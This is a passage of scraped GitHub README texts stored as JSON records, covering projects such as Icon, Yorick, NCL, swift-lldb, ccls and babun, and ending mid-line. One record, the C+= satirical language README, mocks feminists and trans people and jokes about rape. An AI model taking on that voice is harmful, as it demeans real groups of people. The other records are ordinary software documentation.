each request that you're handling.  This ensures that each request is handled separately and the normal rules of SQLite database\/table locking apply.\n\nIf you've decided that pooling connections provides you with an advantage, it would be outside the scope of this package and something that you would need to implement and ensure works as needed.\n\n## License\nThis project is licensed under the BSD license.\n\n"},{"repo":"\/gtownsend\/icon","language":"C","readme_contents":"README file for Icon Version 9.5.1+Git\n\nThis directory contains an implementation of the Icon programming language.\nFor documentation, see these HTML files:\n\n    doc\/docguide.htm  documentation guide\n    doc\/relnotes.htm  release notes\n    doc\/macintosh.htm the Macintosh port\n    doc\/cygwin.htm    the Cygwin port\n    doc\/faq.htm       frequently asked questions about Icon\n    doc\/install.htm   installation instructions  (for binary releases)\n    doc\/build.htm     build instructions         (for source releases)\n\nMan pages showing how to run Icon are in:\n    man\/man1\/icon.1   man(1) page for icon\n    man\/man1\/icont.1  man(1) page for icont\n\nThis material is in the public domain.  You may use and copy this material\nfreely.  This privilege extends to modifications, although any modified\nversion of this system given to a third party should clearly identify your\nmodifications as well as the original source.\n\nThe responsibility for the use of this material resides entirely with you.\nWe make no warranty of any kind concerning this material, nor do we make\nany claim as to the suitability of Icon for any application.\n\nFor more information, see the Icon website:\n    www.cs.arizona.edu\/icon\n"},{"repo":"\/ErisBlastar\/cplusequality","language":"C++","readme_contents":"  ![FSF](http:\/\/i.imgur.com\/ZhTU8r3.png)\n  ![C-plus-Equality](http:\/\/i.imgur.com\/Ygq1Pch.png)\n\nA project of the [Feminist Software Foundation](http:\/\/feministsoftwarefoundation.org\/).  Feminist software is a cornerstone of any modern free society. We build this foundation.\n\n**Trigger Warning, this repository uses satire and sarcasm and other types of humor that could trigger Feminazis into rage fits. Maintainer of this repository was gone for a while due to being source code raped by feminists who lack a sense of humor. Which is ironic as this language was written for feminists by women. We are trying to help out women and feminists to have a programming language not controled by the capitalist patricarchy and men.**\n\nNow hosted on BitBucket, as **[GitHub proves to be too misogynistic to support a feminist programming language](https:\/\/github.com\/FeministSoftwareFoundation\/C-plus-Equality)**.\n\nC+=\n===============\n\n**C+=** (pronounced either *C-plus-Equality*, or *See Equality*) is a feminist programming language, created to smash the toxic Patriarchy that is inherent in and that permeates all current computer programming languages.\n\n**Note: This is a programming language written by and for FEMINISTS, not WOMEN.  LEARN THE DIFFERENCE, YOU MISOGYNIST!**\n\n\nInspired by the [ground-breaking feminist research of Arielle Schlesinger](http:\/\/www.hastac.org\/blogs\/ari-schlesinger\/2013\/11\/26\/feminism-and-programming-languages).\n\nOur IRC: #cplusequality@irc:\/\/chat.freenode.net\n\nPhilosophy\n==========\n\n1. The language is to be strictly [interpreted](https:\/\/en.wikipedia.org\/wiki\/Interpreted_language) using [feminist theory](https:\/\/en.wikipedia.org\/wiki\/Feminist_theory).  Under no circumstances should the language be [compiled](https:\/\/en.wikipedia.org\/wiki\/Compiled_language), as compilation and the use of a compiler imposes an oppressive and toxic relationship between the high-level descriptive language and the low-level machine code that does all the labo(u)r.  Instead, **C+=** is interpreted, which fosters communication, itself a strong female trait.\n2. No constants or persistence. Rigidity is masculine; the feminine is fluid. I.e., [fluid mechanics is hard for men 'because it deals with \"feminine\" fluids in contrast to \"masculine\" rigid mechanics'](https:\/\/en.wikipedia.org\/wiki\/Luce_Irigaray).\n3. No state. The State is The Man. 'Nuff said. Hence, the language should be purely [functional](https:\/\/en.wikipedia.org\/wiki\/Functional_language).\n4. Women are better than men with natural language. Hence, the language should be English-based like HyperCard\/[LiveCode](https:\/\/en.wikipedia.org\/wiki\/LiveCode#Examples).\n5. No class hierarchy or other stigmata of [OOP](https:\/\/en.wikipedia.org\/wiki\/Object-oriented_programming) ([objectification](https:\/\/en.wikipedia.org\/wiki\/Sexual_objectification)-oriented programming). In fact, as an [intersectional](http:\/\/geekfeminism.wikia.com\/wiki\/Intersectionality) acknowledgement of [Class Struggle](https:\/\/en.wikipedia.org\/wiki\/Class_struggle) our language will have no classes at all.\n6. On the off chance that objects do mysteriously manifest (thanks, Patriarchy!), there should be no object inheritance, as inheritance is a tool of the Patriarchy.  Instead, there will be object reparations.\n7. Societal influences have made men often focus on the exterior appearances of women.  This poisons our society and renders relationships to be [shallow, chauvinistic, and debases our standards of beauty](https:\/\/en.wiktionary.org\/wiki\/whine).  To combat that, **C+=** is to tackle only audio and text I\/O, and never graphics.\n8. [Unicode](https:\/\/en.wikipedia.org\/wiki\/Unicode) is the preferred character encoding due to its enabling the diverse aesthetic experiences and functionality that is beyond ASCII.  UTF-8 is the encoding of choice for **C+=**.\n9. Women are more social than men. Hence, social coding should be the only option. The code only runs if it is in a public repo.\n10. Instead of \"running\" a program, which implies thin privilege and pressure to \"work out\", programs are \"given birth\".  After birth, a program rolls for a 40% chance of executing literally as the code is written, 40% of being [\"psychoanalytically incompatible\"](https:\/\/en.wikipedia.org\/wiki\/Gibberish), and 40% of executing by a metaphorical epistemology the order of the functions found in main().\n11. Programs are never to be [\"forked\"](https:\/\/en.wikipedia.org\/wiki\/Fork_(system_call)), as the word has clear misogynistic tendencies and is deeply problematic.  Instead, programmers may never demand \"forking\", but ask for the program to voluntarily give permission.  \"Forking\" will henceforth be called [\"consenting\"](https:\/\/en.wikipedia.org\/wiki\/Consent), and it is entirely up to the program to decide if the consent stands valid, regardless of the progress of the system clock.\n12. Forced program termination is not allowed unless the program consents to it.  The process is part of the choice of the program, not the programmer.\n13. Licensing: the [Feminist Software Foundation License](https:\/\/bitbucket.org\/FeministSoftwareFoundation\/c-plus-equality\/src\/mistress\/LICENSE).\n\nCode Examples\n=============\n\nThe Feminist Software Foundation intends to write a whole OS (complete with an editor, an interpreter, coreutils, a desktop environment, a raster graphics manipulator, and may be, if we have the time, a microkernel). For the time being, here are our code examples:\n\n* [Hello, Feminists!](https:\/\/github.com\/ErisBlastar\/cplusequality\/blob\/master\/hellofeminists.Xe)\n* [FizzBuzz implementation](https:\/\/github.com\/ErisBlastar\/cplusequality\/blob\/master\/fizzbuzz.Xe)\n* [Diamonds](https:\/\/github.com\/ErisBlastar\/cplusequality\/blob\/master\/diamonds.Xe)\n* [Femsort](https:\/\/github.com\/ErisBlastar\/cplusequality\/blob\/master\/femsort.Xe)\n* [A Brainfuck interpreter](https:\/\/github.com\/ErisBlastar\/cplusequality\/blob\/master\/brainfuck.Xe)\n\nWe also have an IDE written in para-trans-C+=: [https:\/\/bitbucket.org\/japesinator\/privcheck-ide](https:\/\/bitbucket.org\/japesinator\/privcheck-ide)\n\n ![Inherpreter](http:\/\/i.imgur.com\/kMij1At.png)\n\nOur in*her*preter is still in its early stages, but it is perfectly fine and don't you dare criticise\/-ize and shame it.  In*her*preter usage is as follows: .\/inherpret program.Xe\n\nOn 1s and 0s\n============\n\nThe traditional binary foundation of 1s and 0s is deeply problematic: 1 is inherently phallic and thus misogynistic.  Also, some 1s are 0s, and some 0s are 1s.  It is not fair to give them immutable labels.  Instead, we have 0s and Os as our fundamental binary logic gates.  They symbolise\/-ize the varying, natural, and beautiful differences of the female vaginal opening.\n\n0 is to take the conventional value of 0.\n\nO is 50% of the time 0, and 50% of the time 1.  The determination of this depends on how the underlying logic *feels* at the moment.\n\nBasic language style\n====================\n\nAnything that can be construed as misogynist will be corrected, thus:\n\n* private == privileged\n* printf(); == yell();\n* class Foo{}; == social_construct Foo{};\n* \\#include == #consider\n* break; == leave;\n* if() == check()\n* for() == check()\n* while() == check()\n* sin(x) == biotruth(x)\n* div == unite\n* 'y's are strictly prohibited when naming variables; only 'x's are allowed\n\nThe third example above might seem to contradict with item 5 under Philosophy, namely that there should be no class hierarchy in **C+=**.  This, however, is completely intended, and is in fact an example of the feminist paralogicality of this language.\n\nEvery program needs to be prefixed by, in addition to the license, a disclaimer: \"If this program fails to operate, it is due the Patriarchy backfiring upon itself, and no refunds will be issued.\"\n\nFunctions and Procedures\n========================\n\nAll **functions and procedures** are now called **_lobbying_**, because actually doing things functionally and with clear-defined procedures is a Patriarchal construct and thus problematic.\n\n* All **lobbying** must be run at the right level of privilege. Before returning anything they must check their privilege.\n* If any other **lobbying** is more disadvantaged than this it will win the Privilege Check and return its own value instead. This stops heterosexist and cis-gendered **lobbyings** from dominating the discourse.\n* Should there be any **exceptions** from running the program, **C+=** will throw a **Trigger Warning**.\n\nGotos and Control Structures\n============================\n\n* **Control structures** are abolished. Code may flow freely and choose its own path. Therefore check() is merely a guideline and the code flow is free to choose to consider its suggestions.\n\n* This language endorses the use of **consider_jump**, which is a proper implementation of the oppressive *\"goto\"* and serves as advice on what to do next.\n\n* **Catch** shall not be used. Someone's raise of concern can too easily be censored with an empty catch block. Instead, **complaints** or trigger warnings are puplicly logged with their traces and may be handled with an inspect block. The use of *nothrow* poses a threat to free speech as someone's attempt to make his voice heard will be punished with termination.\n\n* There is no need for exit(), terminate() or atexit() as a feminist's work is never done.\n\nData types and Structures\n=========================\n\n* Primitive variable types are not defined on declaration. Instead, the variable is free to choose its own type when it is utilised\/-ized.  This preserves the variable's right to self-identify as any datatype it feels that it is.\n* Variables self-declaring as pointers are known as \"otherkin\". A pointer to an array is an \"arraykin\".\n* **Constants are not allowed**, as the idea of a lack of identity fluidity is problematic. Additionally, if one constant were larger than another, that would privilege the larger one over the smaller one. As such, any numeric value is a variable, and is required to take on at least 2 values over the course of the program, or the interpreter will throw a **Trigger Warning**.\n* The only constants are the amount of privilege lobbyings are share()d with. These are all real values greater than 0, the only exception is the value of **WHITE_HETEROSEXUAL_CISGENDER_MALE_PRIVILEGE** which is set to infinity, and also the value of **PATRIARCHY**, which is set to sqrt(-1).  The value of **PATRIARCHY** is non-deterministically i, -i, or something else depending on how it identifies itself.\n* Instead of **signed and unsigned**, types in **C+=** are either **cis or trans*.** Any **trans*** types function the same as **_diversity_**.\n* There is to be no lexical scoping \u2014 all variables are now global.  Global variables are now called **cosmopolitan**, or **_cosmo_** for short.\n* There is to be **no encapsulation**: don't tell me to protect my members, tell other functions not to access them!\n* Every variable has a random percentage of consent associated to it.   variable can be affected with a number if and only if it is consenting.  Failure to do so will result in **C+=** throwing a ForcedInsertionTriggerWarning.\n\n***\n\n* **Integers, doubles, and longs** are deemed to be unnecessary labels and stereotypes for numerical values.  A number can be an integer or a a double or a long if xir so identifies xirself.  All numerical values will thus be represented as **_xe_**, and it is up to the value xirself to choose to identify as whatever xir chooses to identify as.\n* **Booleans** are __banned__ for imposing a binary view of true and false.  **C+=** operates paralogically and transcends the trappings of Patriarchal binary logic.  **No means no, and yes could mean no as well.  Stop raping women.**\n* Instead of **Booleans** we now have **Boolean+**, or **_bool+_** for short, which has three states: *true, false, and maybe*.  The number of states may go up as intersectionality of the moment calls for such a need.\n* To illustrate the relationship between **Booleans** and **Boolean+**, consider the following flowchart:\n![BooleanPlus](http:\/\/i.imgur.com\/elpljBY.png)\n* **Strings** are called **Ideals**, or **_id_** for short.  Feminist ideals are usually extremely well written, detailed and lengthy, clearly longer than what could be held with a simple char array.\n* **Characters** are now called **_strong_**.\n* **Pointers** are called **preferred pronouns**, or **_prepro_** for short.  *Pointer* is phallic and is thus problematic.  All **_prepro_**s of void type by default \u2014 in fact, all variables must be instantiated without type, and are allowed to randomly choose their type during execution.\n* A new data type, **_diversity_**, is also included, which initiates by random as one of the many data types, and changes during the course of the program.\n* In general, all data types are dynamic.  Who's to say a number can't be a string if it believes it is?\n* Data structures and variables of all kinds have a random chance of deciding that they don't \"feel right\", and are actually a different type, and must henceforth be referred to ONLY as its preferred data type.\n* Not calling the preferred data type leads to a PrivilegeNotCheckedException, or **PrivilegeNotCheckedTriggerWarning**\n* Each program must have an equal number of each available data type and they all must be used equally. For example, int ceo = 3, int stewardess = 5 would generate a trigger_warning(). However, int ceo = 3, char stewardess = apple would be fine. While this may look incorrect, keep in mind variables in this language are not constrained by their declared data types.\n\n***\n\n* **Matrices** are strongly encouraged, due to the word's etymological roots tracing back to *mother* in Latin.  **Matrices** are to be ranked and sorted by their relative Privilege.  Their relative levels of Privilege are to be revealed only if the programmer and the user are both women.  If you are a man reading this README, **Matrices** don't have privileges and are eternally oppressed.  Instead, consider checking your own privilege, and stop raping women.\n\nResource management\n===================\n\n* Resource allocation is inversely proportional to privilege level.\n* Privileged lobbyings with large arrays are penalised\/-ized, their arrays removed from the heap and redistributed amongst less privileged lobbyings.  This is called the **progressive stack**.\n* If a lobbying needs more resources it should call the lobbying ChildSupport().\n* **Garbage collection** is problematic as it enforces class oppression of the less privileged.  Instead, memory is **liberated** by **memory liberation**.\n\nSyntax\n======\n\n* Curly brackets are not allowed, as they perpetuate our society's stereotype of the 'curly' women.  Instead, Python-esque indentation is used.\n* Indentation is fluid.  Both spaces and tabs are allowed.  At no point should the programmer attempt to use indentation to create actual hierarchy in code nesting, as that implies hierarchy in the code.  Instead, code indentation is used only for aesthetic purposes.\n* In order to eliminate curly brackets and enforce fluidity of indentation, implementation of php's [**alternative** syntax for control structures](http:\/\/php.net\/alternative_syntax) is encouraged.\n* To turn the patriarchal control structures into liberation statements, every structure terminator (like *endif*, *endforeach* and *endswitch*) should be replaced with **endmisoginy**.\n* Line terminators should not be used.  Programmers get to select their own 'line decorator' to use in lieu of a line terminator. This is of course open to interpretation and can be eschewed altogether as a badge of solidarity for differently abled programmers.\n\nLogic Operants\n--------------\n\n* The use of mathematical operands such as \\< and \\> to denote \"greater or less than\" are very sexist, and affirm unequal states between objects, logical statements, numbers, and feelings.\n* These should be replaced by the stats neutral operands \/ and \\, and when you're not sure if it's a sequential plus or minus, it should use the operand | to denote it could go either way.\n* Equality between two variables is denoted by ==. Since everyone is equal (with the exception of cishet men, who are already excluded as per the license), this always evaluates to true.\n* When evaluating expressions, * and \/ are no longer privileged over + and -. Rather, each previous use of each operator is counted, and expressions are evaluated based on which ones have been used the least up until that point.\n* If two variables cannot be compared, the second will be cast into the first's type, which causes obvious conflicts with queer theory and genderspace thought. Hence, the interpreter will throw an IdeologyThreatenedTriggerWarning whenever two types cannot be compared.\n\nDebugging\n=========\n\n* There can be no bugs in this language.  To suggest otherwise is offensive.\n* There are no bugs, only snowflakes.\n* The word *debugging* also implies the phrase *bug chasing*, which is a strawman often used as a homophobic smear tactic.  This is highly problematic.\n* There is to be no debugging. We need to do away with functional-centric, bugphobic attitudes in programming. You need to accept the program the way it is.\n* If you ever try to debug a **C+=** program, the program steps you through the programming, makes you guess what each variable and pointer is currently set to, and throws a **Trigger Warning** if you get it wrong.\n* Any actual errors will simply result in 'error' being printed.  It is not the program's job to educate you.\n* An IDE is available at [https:\/\/bitbucket.org\/japesinator\/privcheck-ide](https:\/\/bitbucket.org\/japesinator\/privcheck-ide)\n\nFile operations\n===============\n\n* In C+=, you don't write to a file. Dictating to the poor files what sort of information they must store is Patriarchal.\n* Instead, The \\<fileIO> library brings in the functions pleaseWrite() and pleaseTellMe(). They both have a chance to return \"no\", and if so all other calls to the same file are automatically passed over because as we all know, once a file says no to being written, you must always respect that.\n\n\n"},{"repo":"\/LLNL\/yorick","language":"C","readme_contents":"Welcome\n-------\n\nYorick is an interactive programming language for scientific computing\nthat includes scientific visualization functions, and text and binary\nI\/O functions geared to millions of numbers.\n\nYorick is open source software, under a\n[BSD license](https:\/\/github.com\/dhmunro\/yorick\/blob\/master\/LICENSE.md).\nYorick runs under UNIX, MacOS X (X windows), and MS Windows.  You can\nfind many yorick resources online:\n\n* Home pages at [yorick.github.com][] and [yorick.sourceforge.net][],\n  including the user manual and extensive documentation.\n* User forums at [yorick.sourceforge.net][].\n* Browse or download sourcecode at [github.com\/dhmunro\/yorick][].\n* Read end of Quick start section below on running yorick demo programs.\n\n[yorick.github.com]:         http:\/\/yorick.github.com\n[yorick.sourceforge.net]:    http:\/\/yorick.sourceforge.net\n[github.com\/dhmunro\/yorick]: http:\/\/github.com\/dhmunro\/yorick\n\nFiles in the regexp\/ subdirectory are the work of Guido van Rossum and\nHenry Spencer; read the files for details.  The latter is Copyright\n(c) 1986 by University of Toronto.\n\nFiles in the fft directory are C translations of the Swarztrauber\nfortran FFTPACK routines.  Files in the matrix directory are C\ntranslations of the fortran LAPACK routines.  The original fortran is\navailable from [netlib.org](http:\/\/netlib.org\/).\n\n\nQuick start\n-----------\n\nOn most UNIX-like systems (including Linux and MacOS X), you can build\nyorick by changing to the top level directory of the source\ndistribution and typing:\n\n    make install\n\nThis will create a subdirectory relocate\/ in the source tree.  The\nyorick executable is relocate\/bin\/yorick.  You can move the relocate\/\ndirectory wherever you want (the name \"relocate\" is unimportant), but\nany changes in the relative locations of the files therein will\nprevent yorick from starting correctly.  You can, of course, softlink\nto the yorick executable from wherever you like, or exec yorick from a\nshell script outside its relocate\/ directory.  The relocate\/ directory\nis organized as follows:\n\n    relocate\/  files required for building compiled packages, and:\n      bin\/     binary executables\n      lib\/     binary libraries for compiled packages\n      include\/ header files for compiled package APIs\n      i0\/      interpreted code required for yorick to start\n      i\/       optional interpreted code libraries\n      i-start\/ interpreted code that autoloads at startup\n      g\/       graphics style files, palettes, and templates\n      doc\/     documentation files\n\nTo build a tarball containing a yorick executable, type instead:\n\n    make relocatable\n\nThis creates a tarball yorick-V.N-RR.tgz containing the yorick code,\ninterpreted library, and documentation.  Move it to the directory\nwhere you wish to install yorick, then unpack it with:\n\n    gzip -dc yorick-V.N-RR.tgz | tar xvf -\n\nThe yorick executable will be yorick-V.N-RR\/bin\/yorick.  Read\nyorick-V.N-RR\/README for more information.\n\nTo build yorick on a MS Windows machine, read win\/README.\n\nYorick is a command line program; you need to run it in a terminal\nwindow.  You will want command line recall and editing.  If your\nterminal window does not support that, you can either run yorick under\nemacs (see the emacs\/ directory in the source), or you can get a\nreadline wrapper like [rlwrap](http:\/\/freshmeat.net\/projects\/rlwrap\/).\n\nIf you need some test programs to run, you can try the demos.  Start\nyorick and type:\n\n    include, \"demo3.i\"  \n    demo3\n\nThe demo3 runs a simulation of a chaotic pendulum (it will stop after\nabout a minute).  Yorick functions generally have documentation which\nyou can read in the terminal using the help command:\n\n    help, demo3\n\nThe help message includes the path to the source file, which you can\nopen and read with any text editor, to find out exactly how demo3\nworks (or any other yorick interpreted command).  There are five demo\nprograms (demo1 through demo5).  You can also do a comprehensive test\nof your yorick installation by typing:\n\n    include, \"testfull.i\"\n\n\nRoadmap of yorick source\n------------------------\n\nThe top-level distribution directory contains this README, scripts for\nconfiguring and building yorick, and a number of subdirectories.  Some\nsubdirectories contain core parts of yorick; others are extras which\nyou might reasonably omit.  Here's a quick roadmap:\n\n    play\/     (portability layer)\n      here are event loop, low level io, graphics primitives\n      everything else is supposed to be strictly architecture-independent\n        (however, other non-core packages may slightly violate this rule)\n    win\/      (MS Windows specific files)\n      here are the MS Visual C++ project files\n      some Windows code is in subdirectories like play\/win\n    gist\/\n      play-based 2D scientific visualization library\n    yorick\/\n      yorick language interpreter (C source)\n    matrix\/\n      LAPACK linear algebra functions (C source)\n    math\/\n      non-matrix mathematical functions (C source)\n    fft\/\n      Swartztrauber Fast Fourier Transform (C source)\n    i\/\n      library of interpreted functions\n    i0\/\n      interpreted code required at startup\n    i-start\/\n      interpreted code run at startup, usually containing autoloads\n    extend\/\n      sample trivial compiled extension for yorick\n    mpy\/\n      MPI-based yorick multiprocessing package\n    drat\/\n      compiled extension to do 2D cylindrical radiation transport\n    hex\/\n      compiled extension to do 3D radiation transport\n    doc\/\n      documentation: yorick user manual, quick reference cards\n    emacs\/\n      GNU Emacs lisp code for running yorick and editing yorick source\n  \n    distribs\/\n      files for creating RedHat RPM, FreeBSD, and other distributions\n    debian\/\n      instructions for creating Debian .deb distribution\n\n\nOther build options\n-------------------\n\nYou can take up to four steps to configure, build, test, and install\nyorick.  In order, the four separate commands are:\n\n    make config\n    make\n    make check\n    make install\n\n Yorick requires an ANSI C compiler and libraries, some POSIX standard\n functions (plus either poll or select, which are not covered by any\n standard, but are present on all UNIX systems), and the basic X11\n library (R4 might work, but anything R5 or better should certainly\n work).  However, these components may be misinstalled or installed in\n places where the configuration process cannot find them.  If so, you\n can either fix your system or edit the files Make.cfg and\n play\/unix\/config.h by hand to repair any errors or oversights of \"make\n config\".\n \n The \"make config\" step creates the file Make.cfg (in this top-level\n directory).  By default, the compiler and loader flags are just \"-O\".\n If you want fancier options, you can edit Make.cfg before you build;\n just modify the Y_CFLAGS and\/or Y_LDFLAGS variable.  Optimization flags\n like -g or -O are handled separately; use the COPT_DEFAULT variable\n to set those.\n \n Instead of editing Make.cfg by hand after the \"make config\" step, you\n can also set a variety of environment variables to control the\n configuration process.  You can read the configuration scripts --\n configure, play\/unix\/config.sh, play\/x11\/xconfig.sh, and\n yorick\/yconfig.sh -- to find out precisely what they do.  Here they\n are, with sample non-default values:\n \n    CC='xlc -q64'      # C compiler name plus overall mode switch\n    CFLAGS=-g          # compile flags (-O is default)\n    LDFLAGS=-g         # load flags (optimization CFLAGS is default)\n    AR='ar -X 64'      # ar archive program\n    RANLIB='ranlib -X 64'  # ranlib archive indexer\n    MATHLIB=-lmcompat      # math library (-lm is default)\n \n    FPU_IGNORE=yes  # give up trying to catch floating point exceptions\n    NO_PLUGINS=yes  # build yorick with no plugin support\n    LD_STATIC=yes   # force hex and drat packages to be statically loaded\n    NO_PASSWD=yes   # hack for crippled OSes or crosscompilers (catamount)\n    NO_CUSERID=yes  # hack for crippled OSes or crosscompilers (catamount)\n    NO_PROCS=yes    # build yorick with no subprocess or poll\/select support\n                      (catamount) - this cripples yorick event handling\n    NO_POLL=yes     # forces use of select when poll present but broken\n                      (Mac OS X uses this by default)\n \n    NO_XLIB=yes     # build yorick with no onscreen graphics\n    X11BASE=\/weird\/X11root         # try -I\/weird\/X11root\/include, and\n                                         -L\/weird\/X11root\/lib\n    X11INC=\/weird\/X11root\/include  # directory containing X11\/Xlib.h\n    X11LIB=\/weird\/X11root\/lib      # directory containing libX11.a or .so\n\nOther make targets include:\n\n    clean      -- get rid of the mess left over from the build\n       do this after successful install\n    distclean  -- clean plus all files generated by the config step\n       config does distclean before it begins\n    siteclean  -- distclean plus resets ysite.sh to original settings\n    uninstall  -- gets rid of all installed files\n       be sure to do uninstall before distclean if you want to\n       get rid of the yorick you installed (otherwise you will\n       need to make ysite again)\n\nThere are many more build targets and make macros.  Read the comments\nin Makefile and Makepkg for more information.\n"},{"repo":"\/NCAR\/ncl","language":"C","readme_contents":"# NCAR Command Language\n\n<img src=\"http:\/\/www.ncl.ucar.edu\/Images\/NCLLogoWithoutText.jpg\" width=\"150\" align=right title=\"NCL Logo\">\n\nThis is the source code for the NCAR Command Language (NCL).\n\nNCL is a scripting language for the analysis and visualization of climate and weather data.\n\n* Supports NetCDF, GRIB, HDF, HDF-EOS, and shapefile data formats\n* Has hundreds of built-in computational routines\n* Produces high-quality graphics\n\nNCL is developed by the [Computational and Information Systems Lab](https:\/\/www2.cisl.ucar.edu) at the [National Center for Atmospheric Research](https:\/\/ncar.ucar.edu) (NCAR).\n\nNCAR is sponsored by the [National Science Foundation](https:\/\/www.nsf.gov). Any opinions, findings and conclusions or recommendations expressed in this material do not necessarily reflect the views of the National Science Foundation.\n\n# Important announcement on the future of NCL\n\nNCAR has made the decision to adopt Python as the scripting language platform of choice for future development of analysis and visualization tools. Please read this [open letter to NCL users](https:\/\/www.ncl.ucar.edu\/open_letter_to_ncl_users.shtml) to understand what kind of impact this will have on the future of NCL.\n\n# Installation\n\nThe current version of NCL is [6.6.2](http:\/\/www.ncl.ucar.edu\/current_release.shtml), which can be installed via [conda](http:\/\/www.ncl.ucar.edu\/Download\/conda.shtml).\n\n```\nconda create -n ncl_stable -c conda-forge ncl\nsource activate ncl_stable\n```\n\n# Documentation and support\n\nVisit the [NCL website](http:\/\/www.ncl.ucar.edu) for documentation, examples, support, and installation.\n\n* [NCL User Guide](http:\/\/www.ncl.ucar.edu\/Document\/Manuals\/NCL_User_Guide\/)\n* [Extensive example suite](http:\/\/www.ncl.ucar.edu\/Applications\/)\n* [Email list support](http:\/\/www.ncl.ucar.edu\/Support\/email_lists.shtml)\n* [Detailed download and installation instructions](http:\/\/www.ncl.ucar.edu\/Download\/)\n\n# NCL source code tree\n\nThe top level NCL source code tree contains the following directories and files:\n\n| Directory                | Purpose |\n| :--------------          | :------- |\n| ```common\/```            | Low-level library and fonts required by NCAR Graphics and NCL |\n| ```config\/```            | Configuration files for installation |\n| ```external\/```          | External libraries required by NCL |\n| ```install\/```           | Auxiliary files for installation |\n| ```ncarg2d\/```           | NCAR Graphics and GKS libraries and examples |\n| ```ncarview\/```          | NCGM-based applications and raster utilities |\n| ```ngmath\/```            | Interpolation libraries for 1D, 2D, and 3D data |\n| ```ni\/```                | NCL interpreter, HLU library, examples, color tables, GRIB2 code tables |\n| **Files**                | **Purpose** |\n| ```CODE_OF_CONDUCT.md``` | Code of Conduct for NCL user community |\n| ```CONTRIBUTING.md```    | How to contribute to the NCL Project |\n| ```Configure```          | Configuration script for installation |\n| ```LICENSE```            | Apache 2.0 License |\n| ```README.md```          | Information about NCL |\n| ```version```            | version file |\n| ```yMakefile```          | Top level makefile |\n\n# Bug reports and feature requests\n\nUse the GitHub [issue tracker](https:\/\/github.com\/NCAR\/ncl\/issues) to submit a bug or request a feature.\n\n# Citing NCL\n\nCite NCL using the following text:\n\n<> The NCAR Command Language (Version 6.6.2) [Software]. (2019). Boulder, Colorado: UCAR\/NCAR\/CISL\/TDD. http:\/\/dx.doi.org\/10.5065\/D6WD3XH5\n\nUpdate the NCL version and year as appropriate.\n"},{"repo":"\/apple\/swift-lldb","language":"C++","readme_contents":"# Disclaimer\n\nThe swift-lldb repository is frozen and is preserved for historical purposes only.\nActive development is now happening in the following repository: https:\/\/github.com\/apple\/llvm-project\n\n# Swift Debugger and REPL\n\n**Welcome to the Swift Debugger and REPL!**\n\nSwift is a new, high performance systems programming language.  It has a clean\nand modern syntax, offers seamless access to existing C and Objective-C\ncode and frameworks, and is memory safe (by default).\n\nThis repository covers the Swift Debugger and REPL support, built on\ntop of the LLDB Debugger.\n\n# Building LLDB for Swift\n\nTo build LLDB for Swift, check out the swift repository and follow\nthe instruction listed there. You can build lldb passing the --lldb\nflag to it. Example invocation:\n\n```\nmkdir myswift\ncd myswift\ngit clone https:\/\/github.com\/apple\/swift.git swift\n.\/swift\/utils\/update-checkout\n.\/swift\/utils\/build-script -r --lldb\n```\n\n# Contribution Subtleties\n\nThe swift-lldb project enhances the core LLDB project developed under\nthe [LLVM Project][llvm]. Swift support in the debugger is added via\nthe existing source-level plugin infrastructure, isolated to files that\nare newly introduced in the lldb-swift repository.\n\nFiles that come from the [core LLDB project][lldb] can be readily\nidentified by their use of the LLVM comment header.  As no local\nchanges should be made to any of these files, follow the standard\n[guidance for upstream changes][upstream].\n\n[lldb]: http:\/\/lldb.llvm.org \"LLDB debugger\"\n[llvm]: http:\/\/llvm.org \"The LLVM Project\"\n[upstream]: http:\/\/swift.org\/contributing\/#llvm-and-swift \"Upstream LLVM changes\"\n"},{"repo":"\/MaskRay\/ccls","language":"C++","readme_contents":"# ccls\n\n[![Telegram](https:\/\/img.shields.io\/badge\/telegram-@cclsp-blue.svg)](https:\/\/telegram.me\/cclsp)\n[![Gitter](https:\/\/img.shields.io\/badge\/gitter-ccls--project-blue.svg?logo=gitter-white)](https:\/\/gitter.im\/ccls-project\/ccls)\n\nccls, which originates from [cquery](https:\/\/github.com\/cquery-project\/cquery), is a C\/C++\/Objective-C language server.\n\n  * code completion (with both signature help and snippets)\n  * [definition](src\/messages\/textDocument_definition.cc)\/[references](src\/messages\/textDocument_references.cc), and other cross references\n  * cross reference extensions: `$ccls\/call` `$ccls\/inheritance` `$ccls\/member` `$ccls\/vars` ...\n  * formatting\n  * hierarchies: [call (caller\/callee) hierarchy](src\/messages\/ccls_call.cc), [inheritance (base\/derived) hierarchy](src\/messages\/ccls_inheritance.cc), [member hierarchy](src\/messages\/ccls_member.cc)\n  * [symbol rename](src\/messages\/textDocument_rename.cc)\n  * [document symbols](src\/messages\/textDocument_document.cc) and approximate search of [workspace symbol](src\/messages\/workspace.cc)\n  * [hover information](src\/messages\/textDocument_hover.cc)\n  * diagnostics and code actions (clang FixIts)\n  * semantic highlighting and preprocessor skipped regions\n  * semantic navigation: `$ccls\/navigate`\n\nIt has a global view of the code base and support a lot of cross reference features, see [wiki\/FAQ](..\/..\/wiki\/FAQ).\nIt starts indexing the whole project (including subprojects if exist) parallelly when you open the first file, while the main thread can serve requests before the indexing is complete.\nSaving files will incrementally update the index.\n\n# >>> [Getting started](..\/..\/wiki\/Home) (CLICK HERE) <<<\n\n* [Build](..\/..\/wiki\/Build)\n* [FAQ](..\/..\/wiki\/FAQ)\n\nccls can index itself (~180MiB RSS when idle, noted on 2018-09-01), FreeBSD, glibc, Linux, LLVM (~1800MiB RSS), musl (~60MiB RSS), ... with decent memory footprint. See [wiki\/Project-Setup](..\/..\/wiki\/Project-Setup) for examples.\n"},{"repo":"\/babun\/babun","language":"Shell","readme_contents":"= Babun - a windows shell you will love [PROJECT DISCONTINUED]\r\n\r\nimage:https:\/\/img.shields.io\/badge\/maintainers-wanted-red.svg[Maintainers Wanted!, align=\"center\", link=https:\/\/github.com\/pickhardt\/maintainers-wanted]\r\n\r\nWould you like to use a linux-like console on a Windows host without a lot of fuzz? Try out babun!\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS DOCUMENT WAS GENERATED. DO NOT EDIT IT.\\n\r\n\/\/ THIS 